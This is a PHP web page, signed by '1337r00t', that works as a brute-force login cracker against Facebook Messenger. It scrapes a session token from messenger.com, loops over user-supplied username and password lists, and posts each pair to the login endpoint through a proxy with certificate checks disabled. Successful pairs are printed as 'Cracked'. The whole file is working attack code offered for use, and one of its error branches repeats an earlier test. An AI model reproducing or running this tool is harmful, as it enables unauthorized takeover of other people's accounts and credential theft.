<html>
<head>
<title>Brute Force FaceBook (Coded By 1337r00t)</title>
<style type="text/css">
html {
        background: url(http://sc.1337r00t.com/brute/back.jpg) no-repeat center center fixed;
        -webkit-background-size: cover;
        -moz-background-size: cover;
        -o-background-size: cover;
        background-size: cover;
}
</style>
<style>
input[type=text] {
    padding:5px;
    border:2px solid #ccc;
    -webkit-border-radius: 5px;
    border-radius: 5px;
}
 
input[type=text]:focus {
    border-color:#333;
}
 
input[type=submit] {
    padding:5px 15px;
    background:#ccc;
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 5px;
    border-radius: 5px;
}
</style>
</head>
<body>
<center>
<h5><font color="yellow">Coded With Love By 1337r00t</font></h5>
<form action="" method="post">
<font color="yellow"> Proxy : <input type="text" name="proxy" id="proxy"><br><br>
<font color="yellow"> Port : <input type="text" name="port" id="port"><br><br><br>
<textarea cols="39" rows="12" name="usernames" id="usernames" placeholder="usernames"></textarea>      
<textarea cols="39" rows="12" name="passwords" id="usernames" placeholder="passwords"></textarea><br><br>
<input type="submit" name="brute" id="brute" value="Cracking">
</form>
</br>
<?
$proxy = $_POST['proxy'];
$port = $_POST['port'];
$usernames = explode("\r\n", htmlentities($_POST['usernames']));
$passwords = explode("\r\n", htmlentities($_POST['passwords']));
if($_POST['brute'])
{
foreach($usernames as $username)
{
foreach($passwords as $password)
{
##############################################
/*
Generator lsd and initial_request_id
From Facebook
*/
//////////////////////////////////////////////
$html = file_get_contents('https://www.messenger.com/');
//////////////////////////////////////////////
$startlsd = explode('["LSD",[],{"token":"' , $html );
$endlsd = explode('"}' , $startlsd[1] );
$lsd = $endlsd[0];
//////////////////////////////////////////////
##############################################
$facebook = curl_init(); 
curl_setopt($facebook, CURLOPT_URL, "https://www.messenger.com/login/password/"); 
curl_setopt($facebook, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($facebook, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($facebook, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($facebook, CURLOPT_PROXY, $proxy);
curl_setopt($facebook, CURLOPT_PROXYPORT, $port);
curl_setopt($facebook, CURLOPT_HTTPHEADER, array(
    'Host: www.messenger.com',
    'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0',
    'Cookie: _js_datr=Cd0_WRqtRhko7nSpZksB93v-;',
    'Connection: keep-alive'
    ));
curl_setopt($facebook, CURLOPT_POSTFIELDS, "lsd=$lsd&initial_request_id=AAG-wla7hBsW1CxrgeXHxJK&timezone=&lgndim=&lgnrnd=&lgnjs=&email=$username&pass=$password&login=1&default_persistent=0:");
curl_setopt($facebook, CURLOPT_HEADER, 1);
curl_setopt($facebook, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$response = curl_exec($facebook);
if(eregi('HTTP/1.1 302 Found', $response))
	{
		header('HTTP/1.0 200 OK');
		echo "<center><font color='green'>Cracked -> [$username:$password]</font></center>";
	}
	else
	{
		if(eregi('The password you’ve entered is incorrect', $response))
			{
				header('HTTP/1.0 404 Not Found');
				echo "<center><font color='red'>Failed Paswword -> [$username:$password]</font></center>";
			}
			else
			{
				if(eregi('The password you’ve entered is incorrect', $response))
					{
						header('HTTP/1.0 400 Bad Request');
						echo "<center><font color='blue'>Not Found Username or Email [$username]</font></center>";
					}
					else
					{
						header('HTTP/1.1 403 Forbidden');
						echo "<center><font color='yellow'>Blocked IP</font></center>";
					}
			}
	}
curl_close($facebook);
}}}
?>
</center>
</body>
</html>
